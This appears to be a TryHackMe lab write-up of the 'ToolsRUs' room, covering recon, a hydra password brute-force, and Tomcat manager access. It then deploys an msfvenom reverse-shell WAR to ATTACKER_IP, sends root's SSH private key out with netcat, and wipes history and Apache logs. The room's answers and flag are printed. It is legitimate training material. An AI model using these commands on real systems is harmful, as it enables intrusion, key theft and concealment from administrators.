## Index

1. [Setup](#setup)
2. [Reconnaissance](#reconnaissance)
3. [Gaining Access](#gaining-access)
5. [Conclusion](#conclusion)

## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using `openvpn` to connect to the server. Here's the command:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance
Time for some quick port scans and recon (god bless the creators of `rustscan`):
```shell-session
$ rustscan -b 4500 -a TARGET_IP -r 1-65535 --ulimit 5000 -t 2000 -- -oN rustscan_port_scan.txt 
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
1234/tcp open  hotline syn-ack
8009/tcp open  ajp13   syn-ack


$ rustscan -b 4500 -a TARGET_IP -p 22,80,1234,8009 --ulimit 5000 -t 2000 -- -sV -oN rustscan_service_scan.txt
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Some directory enumeration:
```shell-session
$ gobuster dir -t 64 -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_common.txt 
$ cat gobuster_common.txt       
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/guidelines           (Status: 301) [Size: 319] [--> http://TARGET_IP/guidelines/]
/index.html           (Status: 200) [Size: 168]
/protected            (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 301]
```

 > What directory can you find, that begins with a "g"?
 > 
 > Answer: `guidelines`
 
Visiting the `/guidelines/` directory, we only see a text saying: `Hey bob, did you update that TomCat server?`. 

> Whose name can you find from this directory?
> 
> Answer: `bob`


Moreover, requesting the `protected` directory gives us an authentication popup...
> What directory has basic authentication?
> 
> Answer: `protected`

Let's try to brute force it using hydra :)
```shell-session
$ hydra -l bob -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt -s 80 -f TARGET_IP http-get /protected
...
...
[80][http-get] host: TARGET_IP   login: bob   password: bubbles
```

> What is bob's password to the protected part of the website?
> 
> Answer: `bubbles`

When we log into the `protected` page, we're greeted with the following page:
![](protected_page_moved.png)

As we found out from the port scans earlier, there's a _Apache Tomcat server_ running on port **1234**. Let's try and log into the portal there by requesting: `http://TARGET_IP:1234/manager/`. This presents us with a familiar authentication service. If we use the credentials: `bob:bubbles`, we get access to the server panel!

> What other port that serves a webs service is open on the machine?
> 
> Answer: `1234`



The version number for the tomcat server can be found at the bottom of the `manager` page...
> Going to the service running on that port, what is the name and version of the software?
> (Answer format: Full_name_of_service/Version)
> 
> Answer: `Apache Tomcat/7.0.88`

There's a total of 5 documentation files mentioned on the tomcat manager page, so no need to use `nikto` yet (also, it's a bit confusing to use ngl):
> How many documentation files did ~~Nikto~~ you identify?
> 
> Answer: `5`


> What is the server version (run the scan against port 80)?
> 
> Answer: `Apache/2.4.18`


> What version of Apache-Coyote is this service using?
> 
> Answer: `1.1`


Armed with all this info on version numbers and stuff, let's see what exploits we can make use of to get access to the target machine:

## Gaining Access
Now... If we do as the room instructs, this section will usually be _2_ parts, but since we can deploy a file on the `manager` page, we can easily get a reverse shell, (which, moving further, you'll see is a root shell!). Let's begin with generating a suitable payload:
```shell-session
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > reverse.war
```

We're generating a `WAR` file as a payload since that's what we can upload from the `manager` page: 
![](war_file_upload.png)

After the file is deployed, start a listener on the specified port on your machine (4444 in this case), like so:
```shell-session
$ nc -nvlp 4444
```

Now, when we request the URL: `http://TARGET_IP:1234/reverse/`, we'll receive a connection on our netcat listener, and we can move onto stabilizing the shell:
```shell-session
$ nc -nvlp 4444          
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44662

python -c "import pty; pty.spawn('/bin/bash')"
root@ip-TARGET_IP:/# ^Z
zsh: suspended  nc -nvlp 4444

$ stty raw -echo && fg
[1]  + continued  nc -nvlp 4444

export TERM=xterm-256-color
root@ip-TARGET_IP:/# whoami
root

root@ip-TARGET_IP:/# ls /root
flag.txt  snap

root@ip-TARGET_IP:/# cat /root/flag.txt 
`ff1fc4a81affcc7688cf89ae7dc6e0e1`
```

***!!BONUS STEP!!***

Now, even if we have a rooted reverse shell, it's still a hassle to go through uploading the reverse shell and stabilizing it again and again if we plan to exploit this machine later on, so let's get the ssh private key for persistence, as well as clean up the `/reverse.war` file we uploaded:
```shell-session

## On our machine:
$ nc -nvlp 8888 > toysrus_id_rsa

## On target machine;
root@ip-TARGET_IP:/# ssh-keygen
## Empty passphrases...
root@ip-TARGET_IP:/# nc ATTACKER_IP 8888 -w 3 < /root/.ssh/id_rsa
```

Nice! Now we have a persistent access by `ssh`, let's clean up some stuff before we're done...
```shell-session
root@ip-TARGET_IP:/# echo "" > /root/.bash_history 
root@ip-TARGET_IP:/# rm /usr/local/tomcat7/webapps/reverse.war 
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/webapps/reverse/
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/work/Catalina/localhost/reverse
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/access.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/error.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/other_vhosts_access.log 

## Just for good measure...
root@ip-TARGET_IP:/# echo "" > /root/.bash_history
```

And we're done!

> What text is in the file `/root/flag.txt`?
> 
> Answer:  `ff1fc4a81affcc7688cf89ae7dc6e0e1`


## Conclusion
If this writeup helps, please consider following me on github (https://github.com/NovusEdge) and/or dropping a star on the repository: https://github.com/NovusEdge/thm-writeups

---

- Author: Aliasgar Khimani
- Room: [ToyRUs](https://tryhackme.com/room/toolsrus)
